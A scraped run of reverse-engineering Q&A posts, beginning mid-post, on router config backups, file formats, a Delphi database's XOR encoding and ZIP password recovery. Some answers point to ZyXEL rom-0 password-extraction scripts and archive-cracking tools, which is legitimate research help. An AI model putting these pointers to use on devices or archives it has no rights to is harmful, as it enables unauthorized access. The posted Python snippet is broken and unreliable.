<p>but with no luck, later on I found similar file on web with no compression on it, so I take a look and it seams that header of file and couple more ""byts"" are the same as my compressed file and Im not sure how I can skip these first ""byts"" and try to decompress rest of ""data"", also from log u can see some type of ""Sign"" which are also need to be skiped, here is how similar file which is not compressed look like</p>

<pre><code>
00000000  99 99 99 99 44 44 44 44  55 55 55 55 aa aa aa aa  |....DDDDUUUU....|
00000010  00 00 00 00 00 00 00 00  00 00 00 04 00 00 00 00  |................|
00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 40  |...............@|
00000040  00 02 00 00 00 00 00 80  00 04 5e 85 00 00 00 00  |..........^.....|
00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000080  3c 44 42 3e 0a 3c 54 62  6c 20 6e 61 6d 65 3d 22  |&lt;DB&gt;.&lt;Tbl name=""|
00000090  44 42 42 61 73 65 22 20  52 6f 77 43 6f 75 6e 74  |DBBase"" RowCount|
000000a0  3d 22 31 22 3e 0a 3c 52  6f 77 20 4e 6f 3d 22 30  |=""1""&gt;.&lt;Row No=""0|
000000b0  22 3e 0a 3c 44 4d 20 6e  61 6d 65 3d 22 49 46 49  |""&gt;.&lt;DM name=""IFI|
000000c0  6e 66 6f 22 20 76 61 6c  3d 22 30 31 30 31 30 32  |nfo"" val=""010102|
000000d0  30 31 30 34 30 30 30 30  30 30 30 31 30 36 30 31  |0104000000010601|
000000e0  30 34 30 30 30 30 30 32  31 32 35 30 30 30 30 30  |0400000212500000|
000000f0  30 30 35 30 30 31 30 30  30 30 35 30 30 32 30 30  |0050010000500200|
00000100  30 30 35 30 30 33 30 30  30 30 22 2f 3e 0a 3c 2f  |0050030000""/&gt;.&lt;/|
00000110  52 6f 77 3e 0a 3c 2f 54  62 6c 3e 0a 3c 54 62 6c  |Row&gt;.&lt;/Tbl&gt;.&lt;Tbl|
00000120  20 6e 61 6d 65 3d 22 45  54 48 22 20 52 6f 77 43  | name=""ETH"" RowC|
00000130  6f 75 6e 74 3d 22 34 22  3e 0a 3c 52 6f 77 20 4e  |ount=""4""&gt;.&lt;Row N|
00000140  6f 3d 22 30 22 3e 0a 3c  44 4d 20 6e 61 6d 65 3d  |o=""0""&gt;.&lt;DM name=|
00000150  22 56 69 65 77 4e 61 6d  65 22 20 76 61 6c 3d 22  |""ViewName"" val=""|
00000160  49 47 44 2e 4c 44 31 2e  45 54 48 31 22 2f 3e 0a  |IGD.LD1.ETH1""/&gt;.|
00000170  3c 44 4d 20 6e 61 6d 65  3d 22 4c 44 57 44 56 69  |&lt;DM name=""LDWDVi|</code></pre>

<p><a href=""https://www.dropbox.com/s/562nctdc7r8xhmo/default-config.bin/"" rel=""nofollow noreferrer"">Here</a> u can find compressed backup.</p>

<p>Edit: On picture u can see comparasion of two files db_user_cfg.xml (file from log) on (left side) and that ""same file"" but when is ""backedup"" on right side </p>

<p><img src=""https://i.stack.imgur.com/7Mjd5.png"" alt=""Zte compare""></p>
","<p>If you look at offset 0xDF of your backup file you'll see the two bytes:</p>

<blockquote>
  <p>0x78 0xDA</p>
</blockquote>

<p>These commonly delimit the beginning of a zlib compressed file.</p>

<p>In fact, the original XML config file has been split up into multiple zlib compressed blocks:</p>

<pre><code>$ binwalk default-config.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------------------
223           0xDF            Zlib header, best compression, uncompressed size &gt;= 8192
1211          0x4BB           Zlib header, best compression, uncompressed size &gt;= 8192
2260          0x8D4           Zlib header, best compression, uncompressed size &gt;= 8192
2901          0xB55           Zlib header, best compression, uncompressed size &gt;= 8192
3796          0xED4           Zlib header, best compression, uncompressed size &gt;= 8192
4306          0x10D2          Zlib header, best compression, uncompressed size &gt;= 8192
5224          0x1468          Zlib header, best compression, uncompressed size &gt;= 8192
6066          0x17B2          Zlib header, best compression, uncompressed size &gt;= 8192
7084          0x1BAC          Zlib header, best compression, uncompressed size &gt;= 8192
8058          0x1F7A          Zlib header, best compression, uncompressed size &gt;= 8192
8981          0x2315          Zlib header, best compression, uncompressed size &gt;= 3156
</code></pre>

<p>If you decompress each of those blocks and concatenate the decompressed data together, you'll get the original XML config file.</p>
","3601"
"Where to find information about a file format?","3259","","<p>Let's say I found 'some' file (might be an executable, might be data, or something else) and want to run or read it. I open this file in a text editor, but the format isn't readable. Examples include: Java class, Windows executable, SQLite database, DLL, ...</p>

<p><em>I do know the file format, if we can trust the extension.</em></p>

<p>Is there somewhere a site or database with a lot of information about a lot encrypted or binary file formats? Information should include:</p>

<ul>
<li>File use</li>
<li>File layout and structure</li>
<li>Eventually programs that can read or execute the file</li>
</ul>

<p>So I'm not looking for a way to identify the format of the file. I already know the file format, but need to have information about that format. When is the format used (in what applications), what's the format's structure?</p>
","<p>I am a developer for the <a href=""https://bitbucket.org/haypo/hachoir/wiki/Home"">Hachoir project</a>, which aims to describe the format of any file down to the bit-level. Currently it has parsers for a number of well-known formats, including Java classes, Windows executables, MP3 files, etc. The full list of parsers can be found in the subdirectories <a href=""https://bitbucket.org/haypo/hachoir/src/9bae02ddf53ea7284f7a431654849ad5e553c429/hachoir-parser/hachoir_parser?at=default"">here</a>.</p>

<p>When working on a new parser for <code>hachoir_parser</code>, it is often necessary to find information about a file format. There's no single source describing every format (even as Hachoir aspires to be this source, it is not nearly comprehensive enough). Generally, the first step is just to search for <code>&lt;file format name&gt; file format</code>, e.g. <code>java class file format</code>, and look for documentation on official sites (for java classes, this turns up Oracle's documentation, which should be all you need). If there are no official sites, you may still turn up some documentation from someone who has worked on the format in the past.</p>

<p>For common file formats, this turns up the format specification you want about 90-95% of the time. Larger software companies, like Oracle and Microsoft, post their file format specifications online for interoperability purposes. For example, you can find documentation for PE (Windows EXE/DLL), MS Office formats (XLS, PPT, DOC), and other Microsoft formats by browsing or searching MSDN.</p>

<p>For multimedia formats, the <a href=""http://wiki.multimedia.cx/index.php?title=Main_Page"">Multimedia Wiki</a> is a great resource. They also cover some game file formats  as well.</p>

<p>For a less common file format, for which I do not find a specification (or suitable description) from Googling, my approach is usually to find an open-source program that does understand the file, and either locate their format specification source (if described in a commit or README), or read their source code directly to understand the file format.</p>

<p>If there are no open-source programs for the file, and no openly available descriptions of the file format online, the file format is probably quite obscure. For game files (in which many developers insist on using their own proprietary formats), I've found <a href=""http://forum.xentax.com/"">XeNTaX</a> to offer some good pointers and a good community to help figure out the formats. With other kinds of formats, you may have to start examining the samples you have to compare the byte fields and elucidate their function. If you have a program that accepts these files, you can try changing the fields methodically to determine what effects they have on the program's output. This is ultimately the ""real"" reverse-engineering work, and I think it is not within the scope of this answer. </p>
","1664"
"PDB v2.0 File Format documentation","3213","","<p>Where I can find such information? I've already read the undocumented windows 2000 secrets explanation of it but it isn't complete. For example the 3rd stream format isn't explained. I have looked at <a href=""https://code.google.com/p/pdbparser/"" rel=""nofollow"">this</a>, where some general info about the streams is given but nothing more.</p>
","<p>You can find some information about PDB on the blog of PDBParse's <a href=""https://reverseengineering.stackexchange.com/users/257/brendan-dolan-gavitt"">author</a>:</p>

<ul>
<li><a href=""http://moyix.blogspot.fr/2007/08/pdb-stream-decomposition.html"" rel=""nofollow noreferrer"">http://moyix.blogspot.fr/2007/08/pdb-stream-decomposition.html</a></li>
<li><a href=""http://moyix.blogspot.fr/2007/10/types-stream.html"" rel=""nofollow noreferrer"">http://moyix.blogspot.fr/2007/10/types-stream.html</a></li>
</ul>

<p>This article is a good resource about PDB :</p>

<ul>
<li><a href=""http://www.debuginfo.com/articles/debuginfomatch.html"" rel=""nofollow noreferrer"">http://www.debuginfo.com/articles/debuginfomatch.html</a></li>
</ul>

<p>Other link on the subject :</p>

<ul>
<li><a href=""http://www.informit.com/articles/article.aspx?p=22685"" rel=""nofollow noreferrer"">http://www.informit.com/articles/article.aspx?p=22685</a></li>
<li><a href=""http://www.informit.com/articles/article.aspx?p=22429&amp;seqNum=5"" rel=""nofollow noreferrer"">http://www.informit.com/articles/article.aspx?p=22429&amp;seqNum=5</a></li>
<li><a href=""http://www.wintellect.com/blogs/jrobbins/pdb-files-what-every-developer-must-know"" rel=""nofollow noreferrer"">http://www.wintellect.com/blogs/jrobbins/pdb-files-what-every-developer-must-know</a></li>
</ul>

<p>I hope you will find your happiness in these links ;)</p>
","2558"
"Reverse engineering compressed file, where to start?","3210","","<p>I want to open finnish sports league ""data file"" used for bookkeeping. It includes all statistics for few decade, so it's interesting data file.</p>

<p>The file is here: <a href=""http://www.bittilahde.fi/Tietokanta.dat"" rel=""nofollow noreferrer"">http://www.bittilahde.fi/Tietokanta.dat</a> (Database.dat in english)</p>

<p>The book keeping program is here: <a href=""http://www.pesistulokset.fi/Kirjaus504.exe"" rel=""nofollow noreferrer"">http://www.pesistulokset.fi/Kirjaus504.exe</a></p>

<p>What I've found out:</p>

<ul>
<li>The histogram of database file is completely flat</li>
<li>There's no header I could recognize in database file</li>
<li>The .exe is compiled with Delphi 4</li>
<li>I can find some data structures with <a href=""http://kpnc.org/idr32/en/index.htm"" rel=""nofollow noreferrer"">IDR</a>, but cannot figure out how uncompress the file.</li>
</ul>

<p>What could be the next step? </p>
","<p>Looking at it in <a href=""http://www.ollydbg.de/"" rel=""nofollow noreferrer"">OllyDbg</a> it looks like a heavy task. Looks like a custom database with encrypted and (custom?) compressed data. This or the like would usually be the case in such applications. A flat file with structured data is not part of this one.</p>

<p>Anyhow. As a starter:</p>

<p>A quick check after trying out some general compression tools like 7z or binwalk, (have not tested it), can be to use <a href=""http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx"" rel=""nofollow noreferrer"">ProcMon</a> from Sysinternals. Start ProcMon, then your application and set filter on the application in ProcMon. You quickly find that:</p>

<p>In short it reads in chunks of varying size, but for main data processing it reads chunks of 16384 bytes. The process in steps:</p>

<ol>
<li>Generate seed map of 256 integers. (Done once at application start.)</li>
<li>Loop:<br />
2.1 Read 16384 bytes into buffer from .dat file.<br />
2.2 XOR routine on buffer using offset and last four bytes of buffer as base.<br />
2.3 Checksum on XOR'ed buffer using seed map from step 1.<br />
2.4 Parse buffer and read out data.</li>
</ol>

<p>The application also reads same chunks multiple times.</p>

<hr>

<h1>2.1:</h1>

<p>Example:</p>

<pre><code>013D0010  D4 9E BE BF 1C 1C 0B D4 C5 E7 11 B5 09 48 87 FA  Ôž¾¿ÔÅçµ.H‡ú
013D0020  29 4C 03 C9 DE 4A 2B 71 74 7F D2 48 E7 13 94 4E  )LÉÞJ+qtÒHç”N
...
013D3FF0  6A D1 55 92 E2 16 60 53 69 89 86 7D D9 D8 10 BC  jÑU’â`Si‰†}ÙØ¼
013D4000  90 F3 D1 48 28 47 34 EC 39 36 EC 4D 69 2A 7D E5  óÑH(G4ì96ìMi*}å
                                             |_____._____|
                                                   | 
                         Last DWORD aka checksum --+
</code></pre>

<hr>

<p><em>Steps and details in order of discovery:</em></p>

<p>Split the .dat file in chunks of 16384 bytes and also generate a hex-dump of each file for easy search and comparison. To be honest I use Linux for this part with <code>dd</code>, <code>xxd -ps</code>, <code>grep</code>, <code>diff</code> etc.</p>

<p>Start OllyDbg, open the application, locate <code>CreateFile</code> and set breakpoint:</p>

<pre><code>00401220   $-FF25 18825000  JMP DWORD PTR DS:[&lt;&amp;kernel32.CreateFileA&gt;;  kernel32.CreateFileA
</code></pre>

<p>Press <code>F9</code> until filename (in <code>EAX</code>) is .dat file. Set/enable breakpoint on <code>ReadFile</code>. <code>F9</code> and when read is done start stepping and looking at what is done.</p>

<hr>

<p>Looking at it:</p>

<h1>2.2:</h1>

<p>After read it first modify the buffer by using offset as ""magic"" starting at:</p>

<pre><code>0045F5EC  /$ 53   PUSH EBX     ;  ALGO 2: XOR algorithm - post file read.
...
0045F6B6  \. C3   RETN         ;  ALGO 2: RETN
</code></pre>

<p>At least two of the actions taken seems to be <a href=""https://bitbucket.org/hbhzwj/imalse/src/74e53be30a75/tools/inet-3.0/libj_random.c#cl-350"" rel=""nofollow noreferrer"">libj_randl1()</a> and <a href=""https://bitbucket.org/hbhzwj/imalse/src/74e53be30a75/tools/inet-3.0/libj_random.c#cl-364"" rel=""nofollow noreferrer"">libj_randl2()</a>. <em>(This would be step 2.2 in list above.)</em></p>

<p>Simplified:</p>

<pre><code>edx = memory address of buffer
ecx = offset / 0x4000
edi = edx
ebx = ecx * 0x9b9
esi = last dword of buffer &amp; 0x7fffffff
ecx = 0

i = 0;
while (i &lt; 0x3ffc) { /* size of buffer - 4 */
    manipulate buffer
}
</code></pre>

<p>The whole routine translated to C code:</p>



<pre><code>int xor_buf(uint8_t *buf, long offset, long buf_size)
{
    int32_t eax;
    int32_t ebx;
    int32_t esi;
    long i;

    buf_size -= 4;

    ebx = (offset / 0x4000) * 0x9b9;
    /* Intel int 32 */
    esi = (
        (buf[buf_size + 3] &lt;&lt; 24) |
        (buf[buf_size + 2] &lt;&lt; 16) |
        (buf[buf_size + 1] &lt;&lt;  8) |
         buf[buf_size + 0]
        ) &amp; 0x7fffffff;

    for (i = 0; i &lt; buf_size /*0x3ffc*/; ++i) {
        /* libj_randl2(sn) Ref. link above. */
        ebx = ((ebx % 0x0d1a4) * 0x9c4e) - ((ebx / 0x0d1a4) * 0x2fb3);

        if (ebx &lt; 0) {
            ebx += 0x7fffffab;
        }

        /* libj_randl1(sn) Ref. link above. */
        esi = ((esi % 0x0ce26) * 0x9ef4) - ((esi / 0x0ce26) * 0x0ecf);

        if (esi &lt; 0) {
            esi += 0x7fffff07;
        }

        eax = ebx - 0x7fffffab + esi;

        if (eax &lt; 1) {
            eax += 0x7fffffaa;
        }

        /* Modify three next bytes. */    
        buf[i] ^= (eax &gt;&gt; 0x03) &amp; 0xff;

        if (++i &lt;= buf_size) {
            buf[i] ^= (eax &gt;&gt; 0x0d) &amp; 0xff;
        }
        if (++i &lt;= buf_size) {
            buf[i] ^= (eax &gt;&gt; 0x17) &amp; 0xff;
        }
    }

    return 0;
}
</code></pre>

<hr>

<p>Then a checksum is generated of the resulting buffer, (minus last dword), and checked against last dword. Here it uses a buffer from BSS segment that is generated upon startup, <em>step 1. from list above</em>. (Offset <code>0x00505000</code> + <code>0x894</code> and using a region of <code>4 * 0x100</code> as it is 256 32 bit integers). This seed map seems to be constant (never re-generated / changed) and can be skipped if one do not want to validate the buffer.</p>

<h1>1.</h1>

<p>Code point in disassembly (Comments mine.):</p>

<pre><code>0045E614 . 53   PUSH EBX           ;  ALGO 1: GENERATE CHECKSUM MAGICK BSS
...
0045E672 . C3   RETN               ;  ALGO 1: RETN
</code></pre>

<p>The code for the BSS numbers can simplified be written in C as e.g.:</p>



<pre><code>int eax;    /* INT NR 1, next generated number to save */
int i, j;

unsigned int bss[0x100] = {0};  /* offset 00505894 */

for (i = 0; i &lt; 0x100; ++i) {
    eax = i &lt;&lt; 0x18;
    for (j = 0; j &lt; 8; ++j) {
        if (eax &amp; 0x80000000) {
            eax = (eax + eax) ^ 0x4c11db7;
        } else {
            eax &lt;&lt;= 1;
        }
    }
    bss[i] = eax;
}
</code></pre>

<hr>

<h1>2.3:</h1>

<p>That bss int array is used on the manipulated buffer to generate a checksum that should be equal to the last integer in the 16384 bytes read from file. <em>(Last dword, the one skipped in checksum routine and XOR'ing.)</em>. <em>This would be step 2.3 in list above.</em></p>



<pre><code>unsigned char *buf = manipulated file buffer;
unsigned char *bss = memory dump 0x00505894 - 0x00505C90, or from code above

eax = 0x13d0010;  /* Memory location for buffer. */
edx = 0x3ffc;     /* Size of buffer - 4 bytes (checksum). */

...
</code></pre>

<p>At exit <code>ecx</code> is equal to checksum. </p>

<p>Code point in disassembly (Comments mine.):</p>

<pre><code>0045E5A8  /$ 53  PUSH EBX    ;  ALGO 3: CALCULATE CHECKSUM AFTER ALGORITHM 2
...
0045E5E0  \. C3  RETN        ;  ALGO 3: RETN (EAX=CHECKSUM == BUFFER LAST 4 BYTES)
</code></pre>

<p>Shortened to a C routine it could be something like:</p>



<pre><code>int32_t checksum(int32_t map[0x100], uint8_t *buf, long len)
{
    int i;
    int32_t k, cs = 0;

    for (i = 0; i &lt; len; ++i) {
        k = (cs &gt;&gt; 0x18) &amp; 0xff;
        cs = map[buf[i] ^ k] ^ (cs &lt;&lt; 0x08);
    }

    return cs;
}
</code></pre>

<hr>

<p>It is checked to be OK and then checksum in buffer is set as: two least significant bytes = 0, two most significant bytes are set to some number (chunk number in file or read number, (starting from 0)).</p>

<pre><code>0045F9BF   . C680 FC3F0000 &gt;MOV BYTE PTR DS:[EAX+3FFC],0     ;  Set two lower bytes of checksum in dat buf to 0
0045F9C6   . C680 FD3F0000 &gt;MOV BYTE PTR DS:[EAX+3FFD],0     ;  follows previous
0045F9CD   . 66:8B4D F8     MOV CX,WORD PTR SS:[EBP-8]       ;  Set CX to stack pointer value of addr EBP - 8 (counter of sorts)
0045F9D1   . 66:8988 FE3F00&gt;MOV WORD PTR DS:[EAX+3FFE],CX    ;  Set .dat buffer higher bytes like CX.
</code></pre>

<hr>

<p>Now after all this is done the actual copying of data starts with even more algorithms. <strong>Here the real work starts</strong>. Identifying data types, structures, where and what etc. Found some <em>routines</em> that extracted names etc. But everything being Finnish didn't help on making it easier to grasp ;).</p>

<p>The data above could be a start.</p>

<p>Some breakpoints that might be of interest to begin with:</p>

<pre><code>Breakpoints
Address    Module     Active    Disassembly  Comment
0045E5A8   Kirjaus5   Disabled  PUSH EBX     ALGO 3: CALCULATE CHECKSUM AFTER ALGORITHM 2
0045E5E0   Kirjaus5   Disabled  RETN         ALGO 3: RETN (EAX=CHECKSUM == BUFFER LAST 4 BYTES)
0045E614   Kirjaus5   Disabled  PUSH EBX     ALGO 1: GENERATE CHECKSUM MAGIC BSS
0045E672   Kirjaus5   Disabled  RETN         ALGO 1: RETN
0045F5EC   Kirjaus5   Disabled  PUSH EBX     ALGO 2: FILE POST XOR READ ALGORITHM
0045F6B6   Kirjaus5   Disabled  RETN         ALGO 2: RETN
</code></pre>

<hr>

<p><em>Some notes:</em></p>

<p>Keep a backup of the .dat file you are working with. If you abort the application the file often gets corrupted as it, as noted by <a href=""https://reverseengineering.stackexchange.com/users/1924/blabb"">@blabb</a>, write data back to file. The .dat file also seem to be <em>live</em> so a new download of it would result in different data.</p>
","2396"
"Reverse engineering zip file","3203","","<p>Is it possible to reverse engineer ZIP file with password, and get the password or the data that is containing. I'm wondering because there is challenge in hacking lab which is to extract file from ZIP with passwd protection, and it's category is reverse engineering but when I look at the HEX dump I only see the file name.</p>
","<p>From <a href=""http://www.elcomsoft.com/archpr.html"" rel=""nofollow"">http://www.elcomsoft.com/archpr.html</a> -</p>

<blockquote>
  <p>Certain ZIP and ARJ archives can be unlocked and decrypted in just
  minutes, provided that you have at least one unprotected file from
  that archive at your discretion. It does not matter how long and
  complex the password is! If you have a file from the encrypted ZIP
  archive in your hands, the whole archive can be usually unlocked in
  minutes by applying the known-plaintext attack.</p>
  
  <p>After carefully analyzing the algorithms and implementations of
  password protection in different versions of WinZip, ElcomSoft
  developed a work-around solution to allow quick guaranteed decryption
  of certain ZIP archives instead of performing lengthy attacks. If an
  encrypted ZIP archive was created with WinZip version 8 or earlier,
  and if the archive contains 5 or more files, Advanced Archive Password
  Recovery can unlock the archive and decrypt its content – guaranteed!
  A modern PC takes just under one hour to finish the job.</p>
</blockquote>

<p>If those special cases don't apply, you'd need to apply standard brute-force techniques. Either way, you'd want to use <a href=""http://www.elcomsoft.com/archpr.html"" rel=""nofollow"">Advanced Archive Password Recovery</a> or a <a href=""http://www.password-crackers.com/en/category_98/"" rel=""nofollow"">similar tool</a>.</p>
","4252"
"backup from ZynOS but, can not be decompressed with LZS","3200","","<p>So I have this rom-0 file from Zyxel router P-660HW-T3 v3 and I would like to decompress it, I tried many tools, one of them <a href=""http://git.kopf-tisch.de/?p=zyxel-revert;a=summary"" rel=""nofollow"">you can find here</a> the tool using lzs for decompression which works for some rom-0 files (smaller ones around 16 kB), but on mine it does not, mine has around 50 kB and has few differences.Here is ""normal"" file </p>

<pre><code>
00000000  01 01 00 01 19 48 64 62  67 61 72 65 61 00 00 00  |.....Hdbgarea...|
00000010  00 00 00 00 18 00 00 00  01 48 00 00 00 00 00 00  |.........H......|
00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000160  00 00 00 00 00 00 00 00  52 ca c0 ea de ad be af  |........R.......|
00000170  00 00 00 0e 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000180  05 03 00 ad 52 c9 a4 e5  80 46 e7 50 ff ff a1 f4  |....R....F.P....|
00000190  00 00 00 19 00 00 00 00  05 03 00 d4 52 c9 a4 e5  |............R...|
000001a0  80 46 e7 50 ff ff 9e 08  00 00 00 64 80 09 89 ac  |.F.P.......d....|
000001b0  04 03 00 d5 52 c9 bb 21  80 46 eb b8 ff ff a2 30  |....R..!.F.....0|
000001c0  00 09 3a c9 00 00 00 00  04 03 00 d6 52 c9 bb 21  |..:.........R..!|
000001d0  80 46 eb b8 ff ff a2 2f  00 09 3a c9 00 00 00 00  |.F...../..:.....|
000001e0  04 03 00 d7 52 c9 ba 49  80 46 eb b8 ff ff a2 35  |....R..I.F.....5|
000001f0  52 c9 ba 49 00 00 00 00  04 03 00 d8 52 c9 ba 49  |R..I........R..I|
</code></pre>

<p>and
<pre><code>
00000410  80 46 e7 50 ff ff 9e 08  00 00 00 64 80 09 8b 3c  |.F.P.......d...&#60;|
00000420  55 55 55 55 00 00 00 00  00 00 00 00 00 00 00 00  |UUUU............|
00000430  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000006d0  00 00 00 00 55 55 55 55  00 00 00 00 80 41 00 00  |....UUUU.....A..|
000006e0  00 00 00 00 00 00 00 0e  00 00 00 00 00 00 00 01  |................|
000006f0  00 00 00 00 ff ff ff fe  00 00 ff 14 00 00 00 01  |................|
00000700  00 00 00 30 00 00 00 01  80 45 cc f0 00 00 00 01  |...0.....E......|
00000710  00 00 00 01 00 00 00 63  80 41 4c 78 00 00 00 01  |.......c.ALx....|
</pre></code>
and
<pre><code>
00002000  02 94 00 03 1f fc 62 6f  6f 74 00 00 00 00 00 00  |......boot......|
00002010  00 00 00 00 00 20 00 0c  01 48 73 70 74 2e 64 61  |..... ...Hspt.da|
00002020  74 00 00 00 00 00 00 00  1a b0 13 52 01 68 61 75  |t..........R.hau|
00002030  74 6f 65 78 65 63 2e 6e  65 74 00 00 01 f4 01 dc  |toexec.net......|
00002040  1c 18 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00002050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</pre></code>
Here is mine 
<pre><code>
00000000  01 01 00 01 00 00 19 48  64 62 67 61 72 65 61 00  |.......Hdbgarea.|
00000010  00 00 00 00 00 00 00 00  18 00 00 00 00 00 00 00  |................|
00000020  01 48 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |.H..............|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000150  00 00 00 00 00 00 00 05  00 00 00 01 00 00 00 02  |................|
00000160  00 00 00 03 00 00 00 01  00 00 00 00 de ad be af  |................|
00000170  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000180  03 03 00 30 38 6d 46 1a  00 00 00 18 ff ff a1 f4  |...08mF.........|
00000190  00 00 00 01 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000001a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000001b0  00 00 00 00 00 00 00 00  05 03 00 5c 38 6d 46 1a  |...........\8mF.|
000001c0  00 00 00 18 ff ff 9e 08  00 00 00 64 80 09 e0 5c  |...........d...\|
000001d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000001f0  05 03 00 32 38 6d 46 2a  00 00 00 20 ff ff a1 f4  |...28mF*... ....|
00000200  00 00 00 03 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000210  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000220  00 00 00 00 00 00 00 00  04 03 00 5d 38 6d 46 2a  |...........]8mF*|
00000230  00 00 00 20 ff ff a2 29  00 00 00 00 00 00 00 00  |... ...)........|
00000240  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</pre></code></p>

<p><pre><code>
00000ea0  04 03 00 2e 38 6d 45 ee  00 00 00 20 ff ff a1 f4  |....8mE.... ....|
00000eb0  00 00 00 0b 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000ec0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000ed0  00 00 00 00 00 00 00 00  04 03 00 59 38 6d 45 ee  |...........Y8mE.|
00000ee0  00 00 00 20 ff ff a2 33  00 00 00 00 00 00 00 00  |... ...3........|
00000ef0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000f10  04 03 00 5a 38 6d 45 ee  00 00 00 20 ff ff a2 2e  |...Z8mE.... ....|
00000f20  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000f40  00 00 00 00 00 00 00 00  03 03 00 5b 38 6d 45 f7  |...........[8mE.|
00000f50  00 00 00 15 ff ff a5 fc  ff ff f4 47 80 9a e2 98  |...........G....|
00000f60  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000f80  55 55 55 55 00 00 00 00  00 00 00 00 00 00 00 00  |UUUU............|
00000f90  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00001b90  00 00 00 00 55 55 55 55  00 00 00 00 ff ff ff ff  |....UUUU........|
00001ba0  00 00 00 02 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</pre></code></p>

<p><pre><code>
00001fd0  80 7a 00 00 bf c0 5f 90  80 66 00 00 00 00 00 00  |.z...._..f......|
00001fe0  80 5e 05 b4 80 40 11 c8  00 00 00 00 00 00 00 00  |.^...@..........|
00001ff0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00002000  02 c8 00 03 00 00 9f fc  62 6f 6f 74 00 00 00 00  |........boot....|
00002010  00 00 00 00 00 00 00 00  00 20 00 00 00 0c 00 00  |......... ......|
00002020  01 48 73 70 74 2e 64 61  74 00 00 00 00 00 00 00  |.Hspt.dat.......|
00002030  00 00 9a b0 00 00 3f 6c  00 00 01 68 61 75 74 6f  |......?l...hauto|
00002040  65 78 65 63 2e 6e 65 74  00 00 00 00 01 f4 00 00  |exec.net........|
00002050  01 52 00 00 9c 18 00 00  00 00 00 00 00 00 00 00  |.R..............|
00002060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</pre></code></p>

<p><pre><code></p>

<p></pre></code></p>

<p>I separated some parts of the files as u may see above, so what Binwalk says on ""normal"" file</p>

<pre><code>
$ binwalk rom-0

DECIMAL       HEXADECIMAL     DESCRIPTION
------------------------------------------------------------------------------------------------------------------------------------------------------
0             0x0             ZyXEL rom-0 configuration block, name: ""dbgarea"", compressed size: 0, uncompressed size: 6144, data offset from start of block: 344
8212          0x2014          ZyXEL rom-0 configuration block, name: ""spt.dat"", compressed size: 4946, uncompressed size: 6832, data offset from start of block: 376
8232          0x2028          ZyXEL rom-0 configuration block, name: ""autoexec.net"", compressed size: 476, uncompressed size: 500, data offset from start of block: 7208
</code></pre>

<p>and what on mine</p>

<pre><code>
$ binwalk rom-4.51 

DECIMAL       HEXADECIMAL     DESCRIPTION
------------------------------------------------------------------------------------------------------------------------------------------------------
2             0x2             ZyXEL rom-0 configuration block, name: ""dbgarea"", compressed size: 6144, uncompressed size: 0, data offset from start of block: 16
7319          0x1C97          LZMA compressed data, properties: 0xD0, dictionary size: 33554432 bytes, uncompressed size: 31360 bytes
8220          0x201C          ZyXEL rom-0 configuration block, name: ""spt.dat"", compressed size: 39600, uncompressed size: 0, data offset from start of block: 16
8246          0x2036          ZyXEL rom-0 configuration block, name: ""autoexec.net"", compressed size: 500, uncompressed size: 0, data offset from start of block: 16
</code></pre>

<p>LZMA header is ""incorrect"" it cant be decompressed, maybe its modified do not know, so file has dbgarea, spt.dat, autoexec.net standard block but is it comoressed with ""modified"" lzs can u tell ?</p>

<blockquote>
  <p><a href=""http://www.hakim.ws/huawei/rom-0/kender.html"" rel=""nofollow"">Here</a> are some notes from RE of ""old"" rom-0 </p>
</blockquote>

<hr>

<p>so I see that righnt now there ""is no help"" so I will post whole file so u can see whole picture </p>

<p>Heh I have limitation to 30000 chars so here is link of file 
<a href=""http://pastebin.com/2X00B6rJ"" rel=""nofollow"">http://pastebin.com/2X00B6rJ</a> Can any one help me to ""reveal"" what they did (changed) to lzs compresion, I asume its lzs</p>

<p>Many tnx in advice, cheers</p>
","<p>it's compressed with LZS ( Lempel-Ziv-Stack ). </p>

<p>I was trying to do the password extraction the pythonic way, it's enought to take a look at this shell script and small piece of c code:</p>

<p><a href=""https://github.com/MrNasro/scripts/blob/master/exploits/rom0x/"" rel=""nofollow"">shell + C solution</a></p>

<p><a href=""https://gist.github.com/FiloSottile/4663892"" rel=""nofollow"">way of extraction LZS with python</a></p>

<p>and to replace 'dd' usage in same python script:</p>

<p>def romcutter(fname):
    import sys
    fpos=8568
    fend=8788
    fhandle=file(fname)
    fhandle.seek(fpos)
    chunk=""*""
    amount=221
    while fpos &lt; fend:
        if fend-fpos &lt; amount:
            amount = fend-fpos
            chunk = fhandle.read(amount)
            fpos += len(chunk)
            return chunk</p>

<h2>take rom-0, cut it with cutter, and extract result LZS....</h2>
","3832"
"IDA Pro. How to select ARM or THUMB mode when using ""Make Code"" command","3171","","<p>How to select ARM or THUMB mode when using ""Make Code"" command?</p>

